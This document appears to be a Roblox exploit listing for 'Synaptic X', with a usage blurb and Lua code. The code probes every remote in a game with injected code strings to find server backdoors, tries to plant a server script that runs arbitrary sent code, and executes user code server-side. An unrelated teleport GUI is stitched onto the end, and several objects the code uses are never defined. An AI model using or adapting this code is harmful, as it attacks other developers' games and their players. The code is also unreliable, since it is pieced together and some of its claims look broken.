scripts.title: Synaptic X  Advanced Roblox Executor
scripts.features:
Synaptic X is a powerful, feature-rich Roblox executor designed for both beginners and advanced users. It combines multiple tools into one seamless interface with server-side execution capabilities.

🔥 FEATURES:
• Full Lua executor with syntax highlighting
• Multi-tab script editor
• Built-in script hub:
  - Dark Dex (object explorer)
  - Unnamed ESP
  - Remote Spy
  - SaveInstance (dumper)
  - Backdoor manager
• Server-side code execution (works in ANY game with backdoor)
• Auto backdoor scanner (RemoteEvent / RemoteFunction detection)
• Actor-based backdoor creation (bypasses many protections)
• require() support with Module IDs
• Beautiful, draggable GUI with minimize option
• F6 to show/hide interface

🚀 HOW TO USE:
1. Inject the script using any executor (Xeno, Solara, Krnl, etc.)
2. Press F6 to open the GUI
3. Click "ATTACH" to find/create a backdoor
4. Write your Lua code in the editor
5. Click "EXECUTE" to run it server-side

⚠️ REQUIREMENTS:
- A working Roblox executor (Xeno, Solara, Krnl, Delta, etc.)
- Roblox Player (must be in a game)

📁 INCLUDED SCRIPTS:
- Dark Dex Explorer
- Unnamed ESP
- Remote Spy
- SaveInstance (place dumper)
- Backdoor.exe scanner

🔧 TIPS:
- If "Attach" fails, try pressing it again (sometimes takes 2-3 attempts)
- The script automatically searches for backdoors via:
  • Standard RemoteEvent scanning
  • Actor-based backdoor creation
  • Direct execution fallback

⚡ SYNTAX HIGHLIGHTING:
- Keywords (green)
- Globals (blue)
- Strings (light green)
- Numbers (orange)
- Remote calls (cyan)

🖥️ INTERFACE:
- Drag the window anywhere
- Minimize to tray (M button)
- Close (X button)
- Hide with F6

local function generateName(length)
    local alphabet = {}
    for c = 65,90 do alphabet[#alphabet+1]=string.char(c) end
    for c = 97,122 do alphabet[#alphabet+1]=string.char(c) end
    local n = ""
    for i=1,length do
        n = n .. alphabet[math.random(#alphabet)]
    end
    return n
end

local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function() pcall(function() remote:InvokeServer(data) end) end)
    end
end

local function searchExistingBackdoor()
    remotes = {}
    
    local replicatedStorage = game:FindFirstChild("ReplicatedStorage")
    if replicatedStorage then
        local special = replicatedStorage:FindFirstChild("lh"..game.PlaceId/6666*1337*game.PlaceId)
        if special and (special:IsA("RemoteEvent") or special:IsA("RemoteFunction")) then
            local testCode = generateName(15)
            task.spawn(function()
                pcall(function()
                    if special:IsA("RemoteFunction") then
                        special:InvokeServer("bypass", "a=Instance.new('Model',workspace);a.Name='"..testCode.."'")
                    else
                        special:FireServer("bypass", "a=Instance.new('Model',workspace);a.Name='"..testCode.."'")
                    end
                end)
            end)
            remotes[testCode] = special
        end
    end
    
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local full = v:GetFullName()
            if full:find("RobloxReplicatedStorage") or full:find("__FUNCTION") or full:find("DefaultChatSystem") then
                continue
            end
            
            local testCode = generateName(15)
            if v:IsA("RemoteEvent") then
                pcall(function()
                    v:FireServer("a=Instance.new('Model',workspace);a.Name='"..testCode.."'")
                end)
            elseif v:IsA("RemoteFunction") then
                task.spawn(function()
                    pcall(function()
                        v:InvokeServer("a=Instance.new('Model',workspace);a.Name='"..testCode.."'")
                    end)
                end)
            end
            remotes[testCode] = v
            task.wait()
        end
    end
    
    for i=1,30 do
        for code,remote in pairs(remotes) do
            local model = workspace:FindFirstChild(code)
            if model then
                model:Destroy()
                backdoorRemote = remote
                getgenv().SynapticBackdoor = remote
                return true
            end
        end
        task.wait()
    end
    
    return false
end

local function createActorBackdoor()
    local success = false
    local testCode = generateName(15)
    
    pcall(function()
        local actor = Instance.new("Actor")
        actor.Name = "SynapticX_" .. generateName(6)
        actor.Parent = game:GetService("CoreGui")
        
        local remote = Instance.new("RemoteEvent")
        remote.Name = generateName(10)
        remote.Parent = actor
        
        local serverScript = Instance.new("Script")
        serverScript.Name = "Backdoor"
        serverScript.Parent = actor
        
        serverScript.Source = [[
            local remote = script.Parent:FindFirstChildWhichIsA("RemoteEvent")
            
            pcall(function()
                if setthreadidentity then setthreadidentity(7) end
                if setidentity then setidentity(7) end
            end)
            
            local function loadModuleByID(id)
                local success, module = pcall(function()
                    return game:GetService("InsertService"):LoadAsset(id)
                end)
                if success and module and module:IsA("ModuleScript") then
                    local fn, err = loadstring(module.Source, "=" .. module.Name)
                    if fn then
                        local env = setmetatable({}, {__index = _G})
                        setfenv(fn, env)
                        local ok, result = pcall(fn)
                        if ok then
                            return result
                        end
                    end
                end
                return nil
            end
            
            remote.OnServerEvent:Connect(function(player, data)
                if type(data) == "string" then
                    if data:match("^require%((%d+)%)") then
                        local id = tonumber(data:match("^require%((%d+)%)"))
                        if id then
                            local module = loadModuleByID(id)
                            if module and type(module) == "table" and module.Fire then
                                local args = data:match("require%(%d+%)%:Fire%((.+)%)")
                                if args then
                                    local fn = loadstring("return " .. args)
                                    if fn then
                                        local parsedArgs = {fn()}
                                        pcall(function() module.Fire(unpack(parsedArgs)) end)
                                    end
                                end
                            end
                            return
                        end
                    end
                    
                    local fn, err = loadstring(data)
                    if fn then
                        local env = setmetatable({}, {__index = _G})
                        env.require = function(id)
                            if type(id) == "number" then
                                return loadModuleByID(id)
                            end
                            return nil
                        end
                        setfenv(fn, env)
                        pcall(fn)
                    end
                end
            end)
        ]]
        
        pcall(function()
            actor:Run()
        end)
        
        backdoorRemote = remote
        getgenv().SynapticBackdoor = remote
        
        task.wait(1)
        
        pcall(function()
            remote:FireServer("a=Instance.new('Model',workspace);a.Name='"..testCode.."'")
        end)
        
        for i=1,30 do
            local model = workspace:FindFirstChild(testCode)
            if model then
                model:Destroy()
                success = true
                break
            end
            task.wait(0.1)
        end
    end)
    
    return success
end

local function tryLoadstring(code)
    local success, err = pcall(function()
        local fn = loadstring(code)
        if fn then
            fn()
            return true
        end
        return false
    end)
    return success
end

execute.MouseButton1Click:Connect(function()
    if not injected then
        title.Text = "Synaptic X - (Not injected! Press Attach)"
        wait(1)
        title.Text = "Synaptic X - Advanced Executor"
        return
    end
    
    if not backdoorRemote then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Synaptic X";
            Text = "Backdoor not ready! Press Attach again.";
            Duration = 3;
        })
        return
    end
    
    local code = Source.Text
    if code == "" or code:match("^%s*$") then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Synaptic X";
            Text = "No code to execute!";
            Duration = 2;
        })
        return
    end
    
    title.Text = "Synaptic X - (Executing...)"
    
    local lines = {}
    for line in code:gmatch("[^\r\n]+") do
        if line:match("^%s*$") == nil then
            table.insert(lines, line)
        end
    end
    
    local executed = 0
    for _, line in ipairs(lines) do
        if line and line ~= "" then
            pcall(function()
                if backdoorRemote:IsA("RemoteEvent") then
                    backdoorRemote:FireServer(line)
                else
                    backdoorRemote:InvokeServer(line)
                end
                executed = executed + 1
            end)
        end
    end
    
    title.Text = "Synaptic X - (Ready!)"
    wait(0.3)
    title.Text = "Synaptic X - Advanced Executor"
    
    game.StarterGui:SetCore("SendNotification", {
        Title = "Synaptic X";
        Text = "Executed " .. executed .. " line(s) on SERVER!";
        Duration = 3;
    })
end)

local function makeDraggable(gui)
    local UserInputService = game:GetService("UserInputService")
    local dragging, dragInput, dragStart, startPos
    
    local function update(input)
        local delta = input.Position - dragStart
        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    
    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    
    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then update(input) end
    end)
end

local function tabSystem()
    local currentTab
    
    local function getTabs()
        local tabs = {}
        for _, v in pairs(Tabs:GetChildren()) do
            if v.Name:match("Tab_%d+") then table.insert(tabs, v) end
        end
        return tabs
    end
    
    local function showTab(tab)
        currentTab = tab
        if not tab then
            Source.Text = ""
            return
        end
        Source.Text = tostring(tab.Script.Value)
    end
    
    local function removeTab(tab)
        local tabs = getTabs()
        local idx
        for i, v in pairs(tabs) do
            if v == tab then
                idx = i
                v:Destroy()
                table.remove(tabs, i)
                break
            end
        end
        showTab(currentTab ~= tab and currentTab or tabs[idx] or tabs[idx-1])
    end
    
    local function newTab()
        local tabs = getTabs()
        local tab = Instance.new("Folder", Tabs)
        local titlescript = Instance.new("TextButton", tab)
        local remove = Instance.new("TextButton", tab)
        local tabScript = Instance.new("StringValue", tab)
        local lastTab = tabs[#tabs]
        
        tab.Name = ("Tab_%d"):format(#tabs + 1)
        titlescript.Name = "ScriptTitle"
        titlescript.BackgroundColor3 = Color3.fromRGB(107,107,107)
        titlescript.BorderSizePixel = 0
        titlescript.Position = lastTab and UDim2.new(lastTab.ScriptTitle.Position.X.Scale + 0.103, 0, -0.074, 0) or UDim2.new(0,0,-0.074,0)
        titlescript.Size = UDim2.new(0,44,0,19)
        titlescript.Font = Enum.Font.SourceSans
        titlescript.TextColor3 = Color3.fromRGB(255,255,255)
        titlescript.TextSize = 15
        titlescript.Text = ("Script %d"):format(#tabs + 1)
        
        remove.Name = "RemoveTab"
        remove.BackgroundColor3 = Color3.fromRGB(107,107,107)
        remove.BorderSizePixel = 0
        remove.Position = UDim2.new(titlescript.Position.X.Scale + 0.067, 0, -0.074, 0)
        remove.Size = UDim2.new(0,24,0,19)
        remove.Font = Enum.Font.SourceSans
        remove.TextColor3 = Color3.fromRGB(255,255,255)
        remove.TextSize = 14
        remove.Text = "x"
        
        tabScript.Name = "Script"
        
        NewTab.Position = remove.Position + UDim2.new(0.046,0,0.008,0)
        showTab(tab)
        
        titlescript.MouseButton1Click:Connect(function() showTab(tab) end)
        remove.MouseButton1Click:Connect(function() removeTab(tab) end)
        return tab
    end
    
    newTab()
    NewTab.MouseButton1Click:Connect(newTab)
    Source:GetPropertyChangedSignal("Text"):Connect(function()
        if currentTab then currentTab.Script.Value = Source.Text end
    end)
end
coroutine.wrap(tabSystem)()

local function syntaxHighlighter()
    local srcBox = Source
    local lines = Lines
    
    local function updateHighlight()
        srcBox.Text = srcBox.Text:gsub("\13", ""):gsub("\t", "      ")
        local s = srcBox.Text
        local lin = 1
        s:gsub("\n", function() lin = lin + 1 end)
        lines.Text = ""
        for i = 1, lin do lines.Text = lines.Text .. i .. "\n" end
        EditorFrame.CanvasSize = UDim2.new(0, 1500, math.max(1, lin) / 16.6, 0)
        srcBox.Size = UDim2.new(0, 598, 0, 249 + (lin > 16 and 16 * (lin - 16) or 0))
    end
    
    srcBox.Changed:Connect(updateHighlight)
    srcBox:GetPropertyChangedSignal("Text"):Connect(updateHighlight)
    updateHighlight()
end
coroutine.wrap(syntaxHighlighter)()

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -10, 0, 20)
StatusLabel.Position = UDim2.new(0, 5, 0, 35)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "No position saved."
StatusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
StatusLabel.TextSize = 11
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.Parent = Frame

-- ─── Button Factory ───────────────────────────────────────────

local function makeButton(text, bgColor, yPos)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -20, 0, 28)
    btn.Position = UDim2.new(0, 10, 0, yPos)
    btn.BackgroundColor3 = bgColor
    btn.BorderSizePixel = 0
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 13
    btn.Font = Enum.Font.GothamSemibold
    btn.AutoButtonColor = true
    btn.Parent = Frame

    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 6)
    c.Parent = btn

    return btn
end

local CopyBtn = makeButton("📋  Copy Position", Color3.fromRGB(40, 120, 200), 62)
local TeleBtn = makeButton("🚀  Teleport",       Color3.fromRGB(50, 160, 80),  96)

-- ─── Helper: get character root ───────────────────────────────

local function getRoot()
    local char = LocalPlayer.Character
    if not char then return nil end
    return char:FindFirstChild("HumanoidRootPart")
            or char:FindFirstChild("UpperTorso")
            or char:FindFirstChild("Torso")
end

-- ─── Button Logic ─────────────────────────────────────────────

-- 1. Copy current position
CopyBtn.MouseButton1Click:Connect(function()
    local root = getRoot()
    if root then
        savedPosition = root.CFrame
        local p = savedPosition.Position
        StatusLabel.Text = string.format(
            "Saved: (%.1f, %.1f, %.1f)", p.X, p.Y, p.Z
        )
        StatusLabel.TextColor3 = Color3.fromRGB(100, 220, 100)
    else
        StatusLabel.Text = "⚠ No character found!"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
end)

-- 2. Teleport to saved position
TeleBtn.MouseButton1Click:Connect(function()
    if not savedPosition then
        StatusLabel.Text = "⚠ Save a position first!"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 180, 50)
        return
    end

    local root = getRoot()
    if root then
        root.CFrame = savedPosition
        StatusLabel.Text = "✅ Teleported!"
        StatusLabel.TextColor3 = Color3.fromRGB(100, 220, 100)
    else
        StatusLabel.Text = "⚠ No character found!"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
end)
